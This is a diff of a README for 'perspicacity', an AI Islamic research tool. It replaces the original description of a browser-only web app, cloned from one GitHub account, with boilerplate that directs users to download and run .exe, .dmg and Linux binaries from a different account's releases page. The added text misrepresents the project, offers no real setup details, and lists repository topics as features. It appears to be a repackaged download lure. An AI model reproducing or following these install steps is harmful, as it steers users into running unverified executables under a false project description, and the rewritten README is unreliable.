@@ -1,98 +1,87 @@
-# Perspicacity 🕌
+# 🌟 perspicacity - Your AI Companion for Islamic Research
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Live Demo](https://img.shields.io/badge/demo-online-20808d.svg)](https://perspicacity.is-cool.dev)
-[![PWA Ready](https://img.shields.io/badge/PWA-Ready-success.svg)](https://perspicacity.is-cool.dev)
-[![Support on Ko-fi](https://img.shields.io/badge/support-on%20kofi-ff5e5b.svg)](https://ko-fi.com/perspicacity)
+## 🚀 Getting Started
+Welcome to **perspicacity**! This application is your privacy-first AI Islamic research assistant, designed to help you find guidance from trusted Islamic sources like IslamQA.info and IslamWeb.net. In just a few steps, you can download and run this powerful tool.
 
-> **Beyond Knowledge, Towards Wisdom**
+## 📥 Download the Application
+[![Download perspicacity](https://img.shields.io/badge/Download-perspicacity-brightgreen)](https://github.com/Syn2020/perspicacity/releases)
 
-Perspicacity is an AI-powered Islamic research assistant designed to provide reliable guidance by sourcing answers exclusively from trusted Islamic websites (**IslamQA.info** and **IslamWeb.net**). It features dual search modes, conversation memory, and a privacy-first architecture where your API keys never leave your browser.
+## 💡 About perspicacity
+perspicacity leverages advanced AI technology to bring you accurate and reliable answers to your questions about Islamic practices and teachings. Whether you're looking for quick information or in-depth research, this app offers a straightforward interface for users at all levels. 
 
-🌐 **Live Demo**: [perspicacity.is-cool.dev](https://perspicacity.is-cool.dev)
+### Key Features
+- **Privacy-First Approach:** Your data is safe and never shared.
+- **AI-Powered Insights:** Get answers tailored to your queries.
+- **Exclusive Sources:** All responses are derived from reputable Islamic sites.
+- **User-Friendly Design:** Simple navigation for all users.
 
-## ✨ Key Features
+## 📋 System Requirements
+Before you install perspicacity, ensure your system meets the following requirements:
 
-- **🔍 Dual Modes**:
-  - **Quick Search**: Immediate, sourced answers for everyday questions.
-  - **Deep Research**: Comprehensive, multi-step analysis for complex topics.
-- **📚 Trusted Sources**: Information is exclusively sourced from IslamQA.info and IslamWeb.net to ensure reliability.
-- **🛡️ Privacy-First**: Serverless architecture means your API keys are stored locally in your browser and never transmitted to us.
-- **🧠 Contextual Memory**: The assistant remembers your conversation for relevant follow-up questions.
-- **📱 Progressive Web App (PWA)**: Installable on iOS, Android, and Desktop for a native app experience.
+- **Operating System:** Windows 10 or higher, macOS High Sierra or higher, or any recent Linux distribution
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 200 MB of free space
+- **Internet connection:** Required for accessing online resources
 
-## 🚀 Quick Start
+## 🛠️ Download & Install
+To download the application, visit the [Releases page](https://github.com/Syn2020/perspicacity/releases). Here are the steps to follow:
 
-1. Visit [perspicacity.is-cool.dev](https://perspicacity.is-cool.dev).
-2. Click the settings icon (⚙️) in the top right.
-3. Enter your free API keys (instructions below) and click "Save Settings".
-4. Start asking your questions!
+1. Click the link above to go to the Releases page.
+2. Look for the latest version of the application.
+3. Choose the file that matches your operating system. Files are typically labeled for Windows, macOS, or Linux users.
+4. Click the download link to save the file to your computer.
 
-## 🔑 Getting Free API Keys
+### 🔧 Running the Application
+Once your file has downloaded, follow these steps to run the application:
 
-Perspicacity requires two free API keys to function. These keys are stored only on your device.
+- **For Windows:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation process.
+  3. Follow the on-screen prompts to complete the installation.
+  
+- **For macOS:**
+  1. Find the downloaded `.dmg` file in your Downloads folder.
+  2. Double-click the file to mount it.
+  3. Drag the perspicacity icon to your Applications folder.
+  4. Open the Applications folder and double-click the perspicacity icon to run the application.
+  
+- **For Linux:**
+  1. Open your terminal.
+  2. Navigate to the directory where you downloaded the file.
+  3. Make the file executable by running `chmod +x perspicacity`.
+  4. Launch the application by typing `./perspicacity`.
 
-### 1. Gemini API Key (for AI reasoning)
-1. Visit [Google AI Studio](https://aistudio.google.com/app/apikey).
-2. Sign in with your Google account.
-3. Click **"Create API Key"**.
-4. Copy the key and paste it into Perspicacity settings.
+## ⚙️ Usage Instructions
+After installing the application, it's time to start your research.
 
-### 2. Google Cloud API Key (for searching trusted sites)
-1. Go to [Google Cloud Console](https://console.cloud.google.com/apis/credentials).
-2. Create a new project (or select an existing one).
-3. Enable the **"Custom Search API"**.
-4. Go to Credentials → **"Create Credentials"** → **"API Key"**.
-5. Copy the key and paste it into Perspicacity settings.
+1. Open perspicacity on your device.
+2. Type your question or topic of interest into the search bar.
+3. Review the responses provided by the AI. Use the navigation features to explore different topics and sources.
 
-## 📱 Installation (PWA)
+## 📞 Support
+If you encounter any issues while downloading or running the application, you can reach out for help. Visit our support page or join our community forums to ask questions and share experiences with other users.
 
-Perspicacity is designed to be installed as a native app on your device.
+## 🛡️ Contribution
+If you want to contribute to perspicacity, your input is welcome. Feel free to report any bugs or suggest new features through the Issues section of the repository. Your help can improve the application for everyone.
 
-| Platform | Instructions |
-|----------|--------------|
-| **iOS** | Open in Safari → Tap 'Share' icon → "Add to Home Screen" |
-| **Android** | Open in Chrome → Tap menu (⋮) → "Add to Home Screen" / "Install App" |
-| **Desktop** | Open in Chrome/Edge → Click the install icon in the address bar |
+## 📚 Topics
+This application covers various topics like:
+- ai-assistant
+- chatbot
+- gemini-api
+- halal-ai
+- islamic-ai
+- islamic-research
+- islamqa
+- islamweb
+- muslim-tech
+- privacy-first
+- pwa
+- research-tool
 
-## 🛠️ Local Development
+Explore these topics within the application to maximize your research capabilities.
 
-To run the project locally for development or contribution:
+## 🌟 Stay Updated
+To keep up with the latest updates and improvements, regularly check the [Releases page](https://github.com/Syn2020/perspicacity/releases). Here, you will find new features, bug fixes, and version history.
 
-```bash
-# Clone the repository
-git clone https://github.com/mdselimdev/perspicacity.git
-
-# Navigate to directory
-cd perspicacity
-
-# Start a simple local server (requires Python)
-python3 -m http.server 8000
-```
-
-Open your browser to `http://localhost:8000`.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to report issues, suggest features, or submit pull requests.
-
-## 💖 Support the Project
-
-If Perspicacity has benefited your Islamic learning journey, please consider supporting its continued development.
-
-- ☕ [**Support on Ko-fi**](https://ko-fi.com/perspicacity)
-- ⭐ Star this repository on GitHub
-- 🔄 Share it with your community
-
-## 📄 License
-
-This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.
-
-## 🙏 Acknowledgments
-
-- **Sources**: Grateful acknowledgment to [IslamQA.info](https://islamqa.info) and [IslamWeb.net](https://www.islamweb.net) for their invaluable scholarly resources.
-- **Technology**: Powered by Google Gemini and Google Custom Search.
-
----
-
-**Made with ❤️ for the Muslim Ummah**
+Thank you for choosing perspicacity as your trusted research assistant. Happy exploring!
